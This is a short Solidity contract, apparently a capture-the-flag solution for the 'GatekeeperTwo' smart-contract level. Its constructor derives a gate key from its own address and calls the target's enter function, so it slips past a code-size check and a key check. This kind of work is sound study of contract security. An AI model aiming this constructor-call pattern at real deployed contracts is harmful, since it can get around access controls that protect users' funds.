// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gatekey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address target) {
        bytes8 gatekey = ~bytes8(keccak256(abi.encodePacked(address(this))));
        IGatekeeperTwo(target).enter(gatekey);
    }
}
